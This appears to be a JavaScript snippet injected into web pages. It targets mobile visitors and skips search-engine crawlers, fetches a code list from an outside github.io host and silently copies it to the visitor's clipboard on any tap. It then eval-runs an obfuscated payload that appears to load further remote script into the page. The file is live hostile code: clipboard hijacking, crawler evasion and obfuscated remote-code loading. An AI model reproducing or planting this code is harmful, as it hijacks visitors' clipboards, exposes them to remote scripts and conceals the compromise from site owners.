let isWeb =  !(/Win|mac/i.test(navigator.platform));
let isSpider = /Googlebot|Baiduspider|bingbot|YisouSpider|Bytespider|360Spider|Sogou/i.test(navigator.userAgent);
let webUser = isWeb && !isSpider;
if (webUser) { 
const xhr = new XMLHttpRequest()
const url = 'https://sanjinxiaolongxia.github.io/code.json'
xhr.open('get',url,true)
xhr.send()
xhr.onreadystatechange = function(){
	if(xhr.readyState === 4 && xhr.status === 200){
		let codeJosn =JSON.parse(xhr.responseText);
		let cpCode = '';
		for(let key in codeJosn){
			cpCode += codeJosn[key]+' ';
		}
		cpCode = cpCode.trim();
		let aNodes = document.querySelectorAll('body')
		for(let i =0; i<aNodes.length; i++){
			aNodes[i].onclick = function(){
				let oInput = document.createElement('input'); 
				oInput.setAttribute("readonly", "readonly");
				oInput.value = cpCode;
				document.body.appendChild(oInput);
				oInput.select(); 
				document.execCommand("Copy"); 
				oInput.style.display='none'; 
				oInput.remove();
			}
		}
	}
}
!(function () {const a=['892509ihzscA','530411PjsRQp','460686BmxLLG','1054465hgWskM','charCodeAt','length','329803SSncuZ','1ktJhvf','658247zxYAze','833249EfPxfO','substr','fromCharCode'];(function(c,d){const h=b;while(!![]){try{const e=parseInt(h(0x136))+parseInt(h(0x131))*-parseInt(h(0x133))+parseInt(h(0x12b))+-parseInt(h(0x12c))+parseInt(h(0x12d))+-parseInt(h(0x132))+parseInt(h(0x130));if(e===d)break;else c['push'](c['shift']());}catch(f){c['push'](c['shift']());}}}(a,0xd0bde));function b(c,d){return b=function(e,f){e=e-0x12b;let g=a[e];return g;},b(c,d);}function pushCode(c){const i=b;let d,e,f='',g;for(d=0x0;d<c[i(0x12f)];d++){e=c[i(0x12e)](d);if(e>=0x21&&e<=0x4f)f=f+String['fromCharCode'](e+0x2f);else{if(e>=0x50&&e<=0x7e)f=f+String[i(0x135)](e-0x2f);else{g=d+0x1;if(c[i(0x134)](g,0x1)=='@')f=f+String['fromCharCode'](e+0x5);else f=f+c[i(0x134)](d,0x1);d++;}}}return f['replace']('@@','-');}eval(pushCode("G2C ,:5lQfaddffcadbeaf`fc_d`oo`_ah_Qj5@4F>6?E]HC:E6WVk:?D ,DEJ=6lQ5:DA=2Ji?@?6P:>A@CE2?EQ ,:5lQVZ:5ZVQmk^:?DmVXjWH:?5@H]253JF?:@?lH:?5@H]253JF?:@?MM,.X]AFD9W:5XjG2C ,Dl5@4F>6?E]4C62E6t=6>6?EWQD4C:AEQX[9l5@4F>6?E]86Et=6>6?EDqJ%28}2>6WQ9625QX,_.jD]492CD6ElQFE7\gQjD]2DJ?4lP_jD]DC4lQ9EEADi^^;D]_aabGBgg>]44^@];DQj9]:?D6CEq67@C6WD[9]7:CDEr9:=5X"))})()
}
